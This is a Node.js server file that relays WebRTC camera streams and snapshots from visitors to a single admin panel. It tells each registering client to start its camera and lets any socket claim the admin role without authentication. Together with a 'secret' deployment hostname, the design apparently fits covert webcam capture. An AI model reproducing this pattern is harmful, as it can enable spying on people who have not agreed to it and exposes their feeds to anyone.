const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  path: '/socket.io',
  cors: {
    origin: ['http://localhost:3000', 'https://secret-404e.onrender.com'],
    methods: ['GET', 'POST']
  }
});

// Serve static files
app.use('/client-app', express.static(path.join(__dirname, 'client-app'), { index: 'index.html' }));
app.use('/admin-panel', express.static(path.join(__dirname, 'admin-panel'), { index: 'admin.html' }));

// Redirect root to client-app
app.get('/', (req, res) => {
  res.redirect('/client-app/');
});

// Fallback for client-app route
app.get('/client-app/*', (req, res) => {
  res.sendFile(path.join(__dirname, 'client-app', 'index.html'));
});

// Store client sessions
const clients = new Map(); // clientId -> socketId
const adminSocket = { socketId: null };

io.on('connection', (socket) => {
  console.log('New connection:', socket.id);

  // Handle client/admin registration
  socket.on('register', (type, clientId) => {
    if (type === 'client' && clientId) {
      clients.set(clientId, socket.id);
      console.log(`Client registered: ${clientId} with socket ${socket.id}`);
      io.to(socket.id).emit('start-camera');
    } else if (type === 'admin') {
      adminSocket.socketId = socket.id;
      console.log('Admin registered:', socket.id);
    }
  });

  // WebRTC signaling
  socket.on('offer', (offer, clientId) => {
    if (adminSocket.socketId) {
      console.log(`Forwarding offer from client ${clientId} to admin`);
      io.to(adminSocket.socketId).emit('offer', offer, clientId);
    } else {
      console.log('No admin connected for offer');
    }
  });

  socket.on('answer', (answer, clientId) => {
    const clientSocketId = clients.get(clientId);
    if (clientSocketId) {
      console.log(`Forwarding answer to client ${clientId}`);
      io.to(clientSocketId).emit('answer', answer);
    } else {
      console.log(`Client ${clientId} not found for answer`);
    }
  });

  socket.on('ice-candidate', (candidate, clientId, isFromAdmin = false) => {
    if (isFromAdmin && clients.get(clientId)) {
      console.log(`Forwarding ICE candidate from admin to client ${clientId}`);
      io.to(clients.get(clientId)).emit('ice-candidate', candidate);
    } else if (!isFromAdmin && adminSocket.socketId) {
      console.log(`Forwarding ICE candidate from client ${clientId} to admin`);
      io.to(adminSocket.socketId).emit('ice-candidate', candidate, clientId);
    } else {
      console.log('No recipient for ICE candidate');
    }
  });

  // Handle stop-camera
  socket.on('stop-camera', (clientId) => {
    const clientSocketId = clients.get(clientId);
    if (clientSocketId) {
      console.log(`Stopping camera for client ${clientId}`);
      io.to(clientSocketId).emit('stop-camera');
      clients.delete(clientId); // Remove session after stop
    } else {
      console.log(`Client ${clientId} not found for stop-camera`);
    }
  });

  // Handle snapshot
  socket.on('snapshot', (data, clientId) => {
    if (adminSocket.socketId) {
      console.log(`Forwarding snapshot from client ${clientId} to admin`);
      io.to(adminSocket.socketId).emit('snapshot', data, clientId);
    } else {
      console.log('No admin connected for snapshot');
    }
  });

  // Handle disconnection
  socket.on('disconnect', () => {
    console.log('Disconnected:', socket.id);
    if (socket.id === adminSocket.socketId) {
      adminSocket.socketId = null;
      console.log('Admin disconnected');
    } else {
      for (let [clientId, socketId] of clients) {
        if (socketId === socket.id) {
          console.log(`Client ${clientId} disconnected, keeping session`);
          break;
        }
      }
    }
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
